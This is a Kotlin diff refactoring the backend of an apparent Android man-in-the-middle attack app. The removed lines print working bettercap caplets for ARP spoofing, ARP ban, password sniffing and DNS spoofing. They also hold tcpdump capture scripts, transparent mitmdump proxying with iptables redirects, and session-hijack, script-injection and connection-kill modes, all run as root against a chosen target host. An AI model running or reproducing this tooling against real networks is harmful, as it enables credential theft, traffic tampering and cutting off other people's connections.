@@ -27,7 +27,14 @@ class ExternalToolMitmBackend(
     private val sessionStore = MitmSessionStore(context)
     private val blockStore = ConnectionBlockStore(context)
     private val toolchainProbe = ToolchainProbe(resourceProvider, shellRepository, preferencesRepository)
-    private val mitmdumpAddonFactory = MitmdumpAddonFactory(resourceProvider)
+    private val bettercapCapletFactory = BettercapCapletFactory(resourceProvider)
+    private val runtimeController = MitmRuntimeController(shellRepository)
+    private val sessionLauncher = MitmSessionLauncher(
+        resourceProvider = resourceProvider,
+        runtimeController = runtimeController,
+        bettercapCapletFactory = bettercapCapletFactory,
+        mitmdumpAddonFactory = MitmdumpAddonFactory(resourceProvider)
+    )
 
     override fun loadReadiness(shellStatus: ShellStatus): MitmReadiness {
         return toolchainProbe.loadReadiness(shellStatus)
@@ -36,7 +43,11 @@ class ExternalToolMitmBackend(
     override fun loadSession(): MitmSession {
         val record = sessionStore.loadRecord()
             ?: return MitmSession(summary = resourceProvider.getString(R.string.mitm_session_idle))
-        val active = record.pids.any(::isProcessAlive) || record.forwardDropTargetHost.isNotBlank()
+        val active = record.pids.any(runtimeController::isProcessAlive) ||
+            (
+                record.forwardDropTargetHost.isNotBlank() &&
+                    runtimeController.hasForwardDrop(record.forwardDropTargetHost)
+                )
         if (!active) {
             sessionStore.clear()
             return MitmSession(summary = resourceProvider.getString(R.string.mitm_session_idle))
@@ -86,103 +97,21 @@ class ExternalToolMitmBackend(
         val startedAt = System.currentTimeMillis()
         val sessionDirectory = sessionStore.createSessionDirectory(startedAt)
         val mainLogFile = File(sessionDirectory, "bettercap.log")
-        val pidList = mutableListOf<Long>()
-        var artifactPath = ""
-        var redirectPort = 0
-        var forwardingEnabled = false
-        var forwardDropTargetHost = ""
-
-        try {
-            when (request.mode) {
-                MitmMode.CONNECTION_KILL -> startConnectionKill(
-                    config = config,
-                    networkMode = request.networkMode,
-                    interfaceName = interfaceName,
-                    targetHost = targetHost,
-                    sessionDirectory = sessionDirectory,
-                    logFile = mainLogFile,
-                    pidList = pidList
-                ).also { appliedForwardDrop ->
-                    if (appliedForwardDrop) {
-                        forwardDropTargetHost = targetHost
-                    }
-                }
-
-                MitmMode.SNIFFER -> {
-                    artifactPath = File(sessionDirectory, "capture.pcap").absolutePath
-                    forwardingEnabled = true
-                    startSniffer(
-                        config = config,
-                        networkMode = request.networkMode,
-                        interfaceName = interfaceName,
-                        targetHost = targetHost,
-                        gatewayAddress = gatewayAddress,
-                        artifactPath = artifactPath,
-                        sessionDirectory = sessionDirectory,
-                        logFile = mainLogFile,
-                        pidList = pidList
-                    )
-                }
-
-                MitmMode.PASSWORD_SNIFFER -> {
-                    artifactPath = File(sessionDirectory, "credentials.log").absolutePath
-                    forwardingEnabled = true
-                    startPasswordSniffer(
-                        config = config,
-                        networkMode = request.networkMode,
-                        interfaceName = interfaceName,
-                        targetHost = targetHost,
-                        gatewayAddress = gatewayAddress,
-                        artifactPath = artifactPath,
-                        sessionDirectory = sessionDirectory,
-                        pidList = pidList
-                    )
-                }
-
-                MitmMode.DNS_SPOOF -> {
-                    artifactPath = File(sessionDirectory, "dns.spoof.hosts").absolutePath
-                    forwardingEnabled = true
-                    startDnsSpoof(
-                        config = config,
-                        networkMode = request.networkMode,
-                        interfaceName = interfaceName,
-                        targetHost = targetHost,
-                        gatewayAddress = gatewayAddress,
-                        dnsRules = request.payloadValue,
-                        artifactPath = artifactPath,
-                        sessionDirectory = sessionDirectory,
-                        logFile = mainLogFile,
-                        pidList = pidList
-                    )
-                }
-
-                MitmMode.REDIRECT,
-                MitmMode.IMAGE_REPLACE,
-                MitmMode.VIDEO_REPLACE,
-                MitmMode.SCRIPT_INJECTION,
-                MitmMode.CUSTOM_FILTER,
-                MitmMode.SESSION_HIJACK -> {
-                    redirectPort = config.httpRedirectPort
-                    forwardingEnabled = true
-                    artifactPath = startHttpMitmMode(
-                        request = request,
-                        config = config,
-                        networkMode = request.networkMode,
-                        targetHost = targetHost,
-                        interfaceName = interfaceName,
-                        gatewayAddress = gatewayAddress,
-                        redirectPort = redirectPort,
-                        sessionDirectory = sessionDirectory,
-                        logFile = mainLogFile,
-                        pidList = pidList
-                    )
-                }
-            }
+        val launchArtifacts = try {
+            sessionLauncher.launch(
+                request = request,
+                config = config,
+                targetHost = targetHost,
+                interfaceName = interfaceName,
+                gatewayAddress = gatewayAddress,
+                sessionDirectory = sessionDirectory,
+                logFile = mainLogFile
+            )
         } catch (exception: IllegalArgumentException) {
-            cleanupSession(pidList, redirectPort, forwardingEnabled, forwardDropTargetHost)
+            cleanupSession(emptyList(), 0, false, "")
             return MitmActionResult(success = false, summary = exception.message.orEmpty())
         } catch (_: Exception) {
-            cleanupSession(pidList, redirectPort, forwardingEnabled, forwardDropTargetHost)
+            cleanupSession(emptyList(), 0, false, "")
             return MitmActionResult(
                 success = false,
                 summary = resourceProvider.getString(R.string.mitm_session_start_failed)
@@ -200,16 +129,16 @@ class ExternalToolMitmBackend(
                 targetHost
             ),
             logPath = mainLogFile.absolutePath,
-            artifactPath = artifactPath,
+            artifactPath = launchArtifacts.artifactPath,
             startedAtEpochMs = startedAt
         )
         sessionStore.saveRecord(
             ActiveMitmSessionRecord(
                 session = session,
-                pids = pidList,
-                redirectPort = redirectPort,
-                forwardingEnabled = forwardingEnabled,
-                forwardDropTargetHost = forwardDropTargetHost
+                pids = launchArtifacts.pids,
+                redirectPort = launchArtifacts.redirectPort,
+                forwardingEnabled = launchArtifacts.forwardingEnabled,
+                forwardDropTargetHost = launchArtifacts.forwardDropTargetHost
             )
         )
 
@@ -278,18 +207,21 @@ class ExternalToolMitmBackend(
                     )
                 }
                 val config = toolchainProbe.loadConfig()
-                val pid = startBettercapCaplet(
+                val pid = runtimeController.startBettercapCaplet(
                     config = config,
                     name = "connection_block",
                     interfaceName = interfaceName,
                     sessionDirectory = blockDirectory,
                     logFile = logFile,
-                    capletContent = buildArpBanCaplet(targetHost)
-                ) ?: return ConnectionBlockResult(
-                    targetHost = targetHost,
-                    success = false,
-                    summary = resourceProvider.getString(R.string.mitm_session_start_failed)
+                    capletContent = bettercapCapletFactory.buildArpBanCaplet(targetHost)
                 )
+                if (pid == null) {
+                    return ConnectionBlockResult(
+                        targetHost = targetHost,
+                        success = false,
+                        summary = resourceProvider.getString(R.string.mitm_session_start_failed)
+                    )
+                }
                 ActiveConnectionBlockRecord(
                     targetHost = targetHost,
                     interfaceName = interfaceName,
@@ -308,7 +240,7 @@ class ExternalToolMitmBackend(
                         summary = resourceProvider.getString(R.string.mitm_missing_iptables)
                     )
                 }
-                if (!applyForwardDrop(targetHost)) {
+                if (!runtimeController.applyForwardDrop(targetHost)) {
                     return ConnectionBlockResult(
                         targetHost = targetHost,
                         success = false,
@@ -354,183 +286,6 @@ class ExternalToolMitmBackend(
         )
     }
 
-    private fun startConnectionKill(
-        config: MitmToolchainConfig,
-        networkMode: ConnectionBlockMode,
-        interfaceName: String,
-        targetHost: String,
-        sessionDirectory: File,
-        logFile: File,
-        pidList: MutableList<Long>
-    ): Boolean {
-        return when (networkMode) {
-            ConnectionBlockMode.NORMAL -> {
-                val pid = startBettercapCaplet(
-                    config = config,
-                    name = "connection_kill",
-                    interfaceName = interfaceName,
-                    sessionDirectory = sessionDirectory,
-                    logFile = logFile,
-                    capletContent = buildArpBanCaplet(targetHost)
-                ) ?: throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_session_start_failed))
-                pidList += pid
-                false
-            }
-
-            ConnectionBlockMode.HOTSPOT -> {
-                if (!applyForwardDrop(targetHost)) {
-                    throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_session_start_failed))
-                }
-                logFile.writeText("FORWARD DROP active for $targetHost on $interfaceName\n")
-                true
-            }
-        }
-    }
-
-    private fun startSniffer(
-        config: MitmToolchainConfig,
-        networkMode: ConnectionBlockMode,
-        interfaceName: String,
-        targetHost: String,
-        gatewayAddress: String,
-        artifactPath: String,
-        sessionDirectory: File,
-        logFile: File,
-        pidList: MutableList<Long>
-    ) {
-        setForwarding(true)
-        val bettercapPid = if (networkMode == ConnectionBlockMode.NORMAL) {
-            startBettercapCaplet(
-                config = config,
-                name = "spoof_relay",
-                interfaceName = interfaceName,
-                sessionDirectory = sessionDirectory,
-                logFile = logFile,
-                capletContent = buildArpSpoofCaplet(targetHost, gatewayAddress)
-            ).also { it?.let(pidList::add) }
-        } else {
-            null
-        }
-        val tcpdumpPid = startDetachedProcess(
-            name = "tcpdump_capture",
-            sessionDirectory = sessionDirectory,
-            logFile = File(artifactPath),
-            body = buildTcpdumpScript(config, interfaceName, targetHost, artifactPath)
-        )
-        tcpdumpPid?.let(pidList::add)
-        if ((networkMode == ConnectionBlockMode.NORMAL && bettercapPid == null) || tcpdumpPid == null) {
-            throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_session_start_failed))
-        }
-    }
-
-    private fun startPasswordSniffer(
-        config: MitmToolchainConfig,
-        networkMode: ConnectionBlockMode,
-        interfaceName: String,
-        targetHost: String,
-        gatewayAddress: String,
-        artifactPath: String,
-        sessionDirectory: File,
-        pidList: MutableList<Long>
-    ) {
-        setForwarding(true)
-        val bettercapPid = startBettercapCaplet(
-            config = config,
-            name = "password_sniff",
-            interfaceName = interfaceName,
-            sessionDirectory = sessionDirectory,
-            logFile = File(artifactPath),
-            capletContent = if (networkMode == ConnectionBlockMode.NORMAL) {
-                buildPasswordSniffCaplet(targetHost, gatewayAddress)
-            } else {
-                buildHotspotPasswordSniffCaplet(targetHost)
-            }
-        )
-        bettercapPid?.let(pidList::add)
-        if (bettercapPid == null) {
-            throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_session_start_failed))
-        }
-    }
-
-    private fun startDnsSpoof(
-        config: MitmToolchainConfig,
-        networkMode: ConnectionBlockMode,
-        interfaceName: String,
-        targetHost: String,
-        gatewayAddress: String,
-        dnsRules: String,
-        artifactPath: String,
-        sessionDirectory: File,
-        logFile: File,
-        pidList: MutableList<Long>
-    ) {
-        if (dnsRules.trim().isEmpty()) {
-            throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_dns_rules_required))
-        }
-        File(artifactPath).writeText(normalizeBettercapDnsRules(dnsRules))
-        setForwarding(true)
-        val bettercapPid = startBettercapCaplet(
-            config = config,
-            name = "dns_spoof",
-            interfaceName = interfaceName,
-            sessionDirectory = sessionDirectory,
-            logFile = logFile,
-            capletContent = if (networkMode == ConnectionBlockMode.NORMAL) {
-                buildDnsSpoofCaplet(targetHost, gatewayAddress, artifactPath)
-            } else {
-                buildHotspotDnsSpoofCaplet(targetHost, artifactPath)
-            }
-        )
-        bettercapPid?.let(pidList::add)
-        if (bettercapPid == null) {
-            throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_session_start_failed))
-        }
-    }
-
-    private fun startHttpMitmMode(
-        request: MitmLaunchRequest,
-        config: MitmToolchainConfig,
-        networkMode: ConnectionBlockMode,
-        targetHost: String,
-        interfaceName: String,
-        gatewayAddress: String,
-        redirectPort: Int,
-        sessionDirectory: File,
-        logFile: File,
-        pidList: MutableList<Long>
-    ): String {
-        val addonFile = File(sessionDirectory, "mitm_addon.py")
-        val artifactPath = if (request.mode == MitmMode.SESSION_HIJACK) {
-            File(sessionDirectory, "cookies.jsonl").absolutePath
-        } else {
-            addonFile.absolutePath
-        }
-        addonFile.writeText(mitmdumpAddonFactory.build(request, artifactPath))
-
-        val mitmdumpPid = startDetachedProcess(
-            name = "mitmdump_http",
-            sessionDirectory = sessionDirectory,
-            logFile = logFile,
-            body = buildMitmdumpScript(config, addonFile, redirectPort)
-        ) ?: throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_session_start_failed))
-        pidList += mitmdumpPid
-
-        setForwarding(true)
-        applyPortRedirect(redirectPort)
-        if (networkMode == ConnectionBlockMode.NORMAL) {
-            val bettercapPid = startBettercapCaplet(
-                config = config,
-                name = "http_relay",
-                interfaceName = interfaceName,
-                sessionDirectory = sessionDirectory,
-                logFile = logFile,
-                capletContent = buildArpSpoofCaplet(targetHost, gatewayAddress)
-            ) ?: throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_session_start_failed))
-            pidList += bettercapPid
-        }
-        return artifactPath
-    }
-
     private fun cleanupSession(
         pids: List<Long>,
         redirectPort: Int,
@@ -538,30 +293,22 @@ class ExternalToolMitmBackend(
         forwardDropTargetHost: String
     ) {
         pids.forEach { pid ->
-            shellRepository.execute(
-                command = "kill -15 $pid 2>/dev/null || true; sleep 1; kill -0 $pid 2>/dev/null && kill -9 $pid 2>/dev/null || true",
-                asRoot = true,
-                timeoutMs = PROBE_TIMEOUT_MS
-            )
+            runtimeController.terminateProcess(pid)
         }
         if (redirectPort > 0) {
-            shellRepository.execute(
-                command = "while iptables -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports $redirectPort 2>/dev/null; do :; done",
-                asRoot = true,
-                timeoutMs = FIREWALL_TIMEOUT_MS
-            )
+            runtimeController.clearPortRedirect(redirectPort)
         }
         if (forwardingEnabled) {
-            setForwarding(false)
+            runtimeController.setForwarding(false)
         }
         if (forwardDropTargetHost.isNotBlank()) {
-            clearForwardDrop(forwardDropTargetHost)
+            runtimeController.clearForwardDrop(forwardDropTargetHost)
         }
     }
 
     private fun loadConnectionBlockRecord(): ActiveConnectionBlockRecord? {
         val record = blockStore.loadRecord() ?: return null
-        if (record.mode == ConnectionBlockMode.NORMAL && record.pid != null && !isProcessAlive(record.pid)) {
+        if (record.mode == ConnectionBlockMode.NORMAL && record.pid != null && !runtimeController.isProcessAlive(record.pid)) {
             blockStore.clear()
             return null
         }
@@ -574,52 +321,13 @@ class ExternalToolMitmBackend(
             ConnectionBlockMode.NORMAL -> {
                 val pid = record.pid
                 if (pid != null) {
-                    shellRepository.execute(
-                        command = "kill -15 $pid 2>/dev/null || true; sleep 1; kill -0 $pid 2>/dev/null && kill -9 $pid 2>/dev/null || true",
-                        asRoot = true,
-                        timeoutMs = PROBE_TIMEOUT_MS
-                    )
+                    runtimeController.terminateProcess(pid)
                 }
             }
 
-            ConnectionBlockMode.HOTSPOT -> clearForwardDrop(record.targetHost)
+            ConnectionBlockMode.HOTSPOT -> runtimeController.clearForwardDrop(record.targetHost)
         }
         blockStore.clear()
-    }
-
-    private fun applyForwardDrop(targetHost: String): Boolean {
-        val result = shellRepository.execute(
-            command = buildString {
-                append("iptables -C FORWARD -s ")
-                append(targetHost)
-                append(" -j DROP 2>/dev/null || iptables -I FORWARD -s ")
-                append(targetHost)
-                append(" -j DROP\n")
-                append("iptables -C FORWARD -d ")
-                append(targetHost)
-                append(" -j DROP 2>/dev/null || iptables -I FORWARD -d ")
-                append(targetHost)
-                append(" -j DROP\n")
-            },
-            asRoot = true,
-            timeoutMs = FIREWALL_TIMEOUT_MS
-        )
-        return result.exitCode == 0 && !result.timedOut
-    }
-
-    private fun clearForwardDrop(targetHost: String) {
-        shellRepository.execute(
-            command = buildString {
-                append("while iptables -D FORWARD -s ")
-                append(targetHost)
-                append(" -j DROP 2>/dev/null; do :; done\n")
-                append("while iptables -D FORWARD -d ")
-                append(targetHost)
-                append(" -j DROP 2>/dev/null; do :; done\n")
-            },
-            asRoot = true,
-            timeoutMs = FIREWALL_TIMEOUT_MS
-        )
     }
 
     private fun missingToolSummary(
@@ -668,154 +376,6 @@ class ExternalToolMitmBackend(
         }
     }
 
-    private fun startBettercapCaplet(
-        config: MitmToolchainConfig,
-        name: String,
-        interfaceName: String,
-        sessionDirectory: File,
-        logFile: File,
-        capletContent: String
-    ): Long? {
-        val capletFile = File(sessionDirectory, "$name.cap")
-        capletFile.writeText(capletContent)
-        return startDetachedProcess(
-            name = name,
-            sessionDirectory = sessionDirectory,
-            logFile = logFile,
-            body = buildBettercapScript(config, interfaceName, capletFile)
-        )
-    }
-
-    private fun buildBettercapScript(
-        config: MitmToolchainConfig,
-        interfaceName: String,
-        capletFile: File
-    ): String {
-        val bettercapPath = config.bettercapPath.trim()
-        if (bettercapPath.contains('/')) {
-            val sourceBinary = File(bettercapPath)
-            val sourceDirectory = sourceBinary.parentFile
-                ?: throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_session_start_failed))
-            val sourceLibusb = File(sourceDirectory, "libusb1.0.so")
-            val sourceCompatLibusb = File(sourceDirectory, "libusb-1.0.so")
-            return buildString {
-                append("set -e\n")
-                append("runtime_dir=")
-                append(shellQuote("$BETTERCAP_RUNTIME_DIRECTORY_PREFIX-$$"))
-                append('\n')
-                append("rm -rf \"${'$'}runtime_dir\"\n")
-                append("mkdir -p \"${'$'}runtime_dir\"\n")
-                append("cp ")
-                append(shellQuote(sourceBinary.absolutePath))
-                append(" \"${'$'}runtime_dir/bettercap\"\n")
-                append("if [ -f ")
-                append(shellQuote(sourceLibusb.absolutePath))
-                append(" ]; then cp ")
-                append(shellQuote(sourceLibusb.absolutePath))
-                append(" \"${'$'}runtime_dir/libusb1.0.so\"; fi\n")
-                append("if [ -f ")
-                append(shellQuote(sourceCompatLibusb.absolutePath))
-                append(" ]; then cp ")
-                append(shellQuote(sourceCompatLibusb.absolutePath))
-                append(" \"${'$'}runtime_dir/libusb-1.0.so\"; fi\n")
-                append("if [ ! -f \"${'$'}runtime_dir/libusb-1.0.so\" ] && [ -f \"${'$'}runtime_dir/libusb1.0.so\" ]; then cp \"${'$'}runtime_dir/libusb1.0.so\" \"${'$'}runtime_dir/libusb-1.0.so\"; fi\n")
-                append("chmod 755 \"${'$'}runtime_dir/bettercap\"\n")
-                append("if [ -f \"${'$'}runtime_dir/libusb1.0.so\" ]; then chmod 755 \"${'$'}runtime_dir/libusb1.0.so\"; fi\n")
-                append("if [ -f \"${'$'}runtime_dir/libusb-1.0.so\" ]; then chmod 755 \"${'$'}runtime_dir/libusb-1.0.so\"; fi\n")
-                append("cd \"${'$'}runtime_dir\" || exit 1\n")
-                append("export LD_LIBRARY_PATH=\"${'$'}runtime_dir:${'$'}{LD_LIBRARY_PATH}\"\n")
-                append("exec ")
-                append("\"${'$'}runtime_dir/bettercap\"")
-                append(" -iface ")
-                append(shellQuote(interfaceName))
-                append(" -no-colors -caplet ")
-                append(shellQuote(capletFile.absolutePath))
-                append('\n')
-            }
-        }
-        return buildString {
-            append("exec ")
-            append(shellCommandToken(bettercapPath))
-            append(" -iface ")
-            append(shellQuote(interfaceName))
-            append(" -no-colors -caplet ")
-            append(shellQuote(capletFile.absolutePath))
-            append('\n')
-        }
-    }
-
-    private fun buildArpBanCaplet(targetHost: String): String {
-        return """
-set events.stream.output stdout
-set arp.spoof.targets $targetHost
-arp.ban on
-sleep 31536000
-""".trimIndent()
-    }
-
-    private fun buildArpSpoofCaplet(targetHost: String, gatewayAddress: String): String {
-        return """
-set events.stream.output stdout
-set gateway.address $gatewayAddress
-set arp.spoof.fullduplex true
-set arp.spoof.targets $targetHost
-arp.spoof on
-sleep 31536000
-""".trimIndent()
-    }
-
-    private fun buildPasswordSniffCaplet(targetHost: String, gatewayAddress: String): String {
-        return """
-set events.stream.output stdout
-set gateway.address $gatewayAddress
-set arp.spoof.fullduplex true
-set arp.spoof.targets $targetHost
-arp.spoof on
-set net.sniff.local false
-set net.sniff.verbose false
-set net.sniff.filter "host $targetHost and not arp"
-net.sniff on
-sleep 31536000
-""".trimIndent()
-    }
-
-    private fun buildHotspotPasswordSniffCaplet(targetHost: String): String {
-        return """
-set events.stream.output stdout
-set net.sniff.local false
-set net.sniff.verbose false
-set net.sniff.filter "host $targetHost and not arp"
-net.sniff on
-sleep 31536000
-""".trimIndent()
-    }
-
-    private fun buildDnsSpoofCaplet(targetHost: String, gatewayAddress: String, hostsFilePath: String): String {
-        return """
-set events.stream.output stdout
-set gateway.address $gatewayAddress
-set arp.spoof.fullduplex true
-set arp.spoof.targets $targetHost
-arp.spoof on
-set dns.spoof.all false
-set dns.spoof.hosts ${hostsFilePath}
-dns.spoof on
-sleep 31536000
-""".trimIndent()
-    }
-
-    private fun buildHotspotDnsSpoofCaplet(targetHost: String, hostsFilePath: String): String {
-        return """
-set events.stream.output stdout
-set net.sniff.local false
-set net.sniff.filter "host $targetHost and not arp"
-set dns.spoof.all false
-set dns.spoof.hosts ${hostsFilePath}
-dns.spoof on
-sleep 31536000
-""".trimIndent()
-    }
-
     private fun requiresGateway(mode: MitmMode, networkMode: ConnectionBlockMode): Boolean {
         if (networkMode == ConnectionBlockMode.HOTSPOT) {
             return false
@@ -834,147 +394,6 @@ sleep 31536000
         }
     }
 
-    private fun buildTcpdumpScript(
-        config: MitmToolchainConfig,
-        interfaceName: String,
-        targetHost: String,
-        artifactPath: String
-    ): String {
-        return "exec ${shellCommandToken(config.tcpdumpPath)} -i ${shellQuote(interfaceName)} -n -s 0 host ${shellQuote(targetHost)} and not arp -w ${shellQuote(artifactPath)}\n"
-    }
-
-    private fun buildMitmdumpScript(
-        config: MitmToolchainConfig,
-        addonFile: File,
-        redirectPort: Int
-    ): String {
-        val mitmdumpPath = config.mitmdumpPath.trim()
-        if (mitmdumpPath.contains('/')) {
-            val sourceBinary = File(mitmdumpPath)
-            val binDirectory = sourceBinary.parentFile
-            val bundleRoot = binDirectory?.parentFile
-            if (binDirectory?.name == "bin" && bundleRoot != null && File(bundleRoot, "python").isDirectory) {
-                return buildManagedMitmdumpScript(bundleRoot, addonFile, redirectPort)
-            }
-        }
-        return buildString {
-            append("exec ")
-            append(shellCommandToken(mitmdumpPath))
-            append(" --mode transparent --showhost ")
-            append("--set block_global=false ")
-            append("--listen-host 0.0.0.0 ")
-            append("--listen-port ")
-            append(redirectPort)
-            append(" -s ")
-            append(shellQuote(addonFile.absolutePath))
-            append('\n')
-        }
-    }
-
-    private fun buildManagedMitmdumpScript(
-        bundleRoot: File,
-        addonFile: File,
-        redirectPort: Int
-    ): String {
-        return buildString {
-            append("set -e\n")
-            append("runtime_dir=")
-            append(shellQuote("$MITMDUMP_RUNTIME_DIRECTORY_PREFIX-$$"))
-            append('\n')
-            append("rm -rf \"${'$'}runtime_dir\"\n")
-            append("mkdir -p \"${'$'}runtime_dir\"\n")
-            append("cp -R ")
-            append(shellQuote("${bundleRoot.absolutePath}/."))
-            append(" \"${'$'}runtime_dir\"\n")
-            append("find \"${'$'}runtime_dir\" -type d -exec chmod 755 {} \\;\n")
-            append("if [ -f \"${'$'}runtime_dir/bin/mitmdump\" ]; then chmod 755 \"${'$'}runtime_dir/bin/mitmdump\"; fi\n")
-            append("if [ -f \"${'$'}runtime_dir/python/bin/python3\" ]; then chmod 755 \"${'$'}runtime_dir/python/bin/python3\"; fi\n")
-            append("find \"${'$'}runtime_dir\" -type f -name '*.so' -exec chmod 755 {} \\; 2>/dev/null || true\n")
-            append("cd \"${'$'}runtime_dir\" || exit 1\n")
-            append("exec ")
-            append("\"${'$'}runtime_dir/bin/mitmdump\"")
-            append(" --mode transparent --showhost ")
-            append("--set block_global=false ")
-            append("--listen-host 0.0.0.0 ")
-            append("--listen-port ")
-            append(redirectPort)
-            append(" -s ")
-            append(shellQuote(addonFile.absolutePath))
-            append('\n')
-        }
-    }
-
-    private fun normalizeBettercapDnsRules(rawRules: String): String {
-        return rawRules.lineSequence()
-            .map { it.trim() }
-            .filter { it.isNotEmpty() }
-            .joinToString("\n") { line ->
-                val tokens = line.split(Regex("\\s+"))
-                when {
-                    tokens.size >= 3 && tokens[1].equals("A", ignoreCase = true) ->
-                        "${tokens[2]} ${tokens[0]}"
-                    tokens.size >= 2 ->
-                        "${tokens[1]} ${tokens[0]}"
-                    else -> throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_filter_rule_invalid, line))
-                }
-            } + "\n"
-    }
-
-    private fun startDetachedProcess(
-        name: String,
-        sessionDirectory: File,
-        logFile: File,
-        body: String
-    ): Long? {
-        val scriptFile = File(sessionDirectory, "$name.sh")
-        scriptFile.writeText("#!/system/bin/sh\n$body")
-        val result = shellRepository.execute(
-            command = buildString {
-                append("chmod 700 ")
-                append(shellQuote(scriptFile.absolutePath))
-                append("; nohup sh ")
-                append(shellQuote(scriptFile.absolutePath))
-                append(" >> ")
-                append(shellQuote(logFile.absolutePath))
-                append(" 2>&1 < /dev/null & echo $!")
-            },
-            asRoot = true,
-            timeoutMs = FIREWALL_TIMEOUT_MS
-        )
-        if (result.exitCode != 0 || result.timedOut) {
-            return null
-        }
-        return result.output.lineSequence()
-            .map { it.trim() }
-            .lastOrNull { it.isNotEmpty() }
-            ?.toLongOrNull()
-    }
-
-    private fun applyPortRedirect(port: Int) {
-        shellRepository.execute(
-            command = "iptables -t nat -C PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports $port 2>/dev/null || iptables -t nat -I PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports $port",
-            asRoot = true,
-            timeoutMs = FIREWALL_TIMEOUT_MS
-        )
-    }
-
-    private fun setForwarding(enabled: Boolean) {
-        shellRepository.execute(
-            command = "echo ${if (enabled) 1 else 0} > /proc/sys/net/ipv4/ip_forward",
-            asRoot = true,
-            timeoutMs = PROBE_TIMEOUT_MS
-        )
-    }
-
-    private fun isProcessAlive(pid: Long): Boolean {
-        val result = shellRepository.execute(
-            command = "kill -0 $pid",
-            asRoot = true,
-            timeoutMs = PROBE_TIMEOUT_MS
-        )
-        return result.exitCode == 0 && !result.timedOut
-    }
-
     private fun validateIpv4(hostAddress: String): String? {
         return try {
             val address = InetAddress.getByName(hostAddress.trim())
@@ -982,20 +401,5 @@ sleep 31536000
         } catch (_: Exception) {
             null
         }
-    }
-
-    private fun shellQuote(value: String): String {
-        return "'" + value.replace("'", "'\"'\"'") + "'"
-    }
-
-    private fun shellCommandToken(value: String): String {
-        return if (value.contains('/')) shellQuote(value) else value
-    }
-
-    companion object {
-        private const val PROBE_TIMEOUT_MS = 2000L
-        private const val FIREWALL_TIMEOUT_MS = 4000L
-        private const val BETTERCAP_RUNTIME_DIRECTORY_PREFIX = "/data/local/tmp/fsploit-bettercap"
-        private const val MITMDUMP_RUNTIME_DIRECTORY_PREFIX = "/data/local/tmp/fsploit-mitmdump"
     }
 }
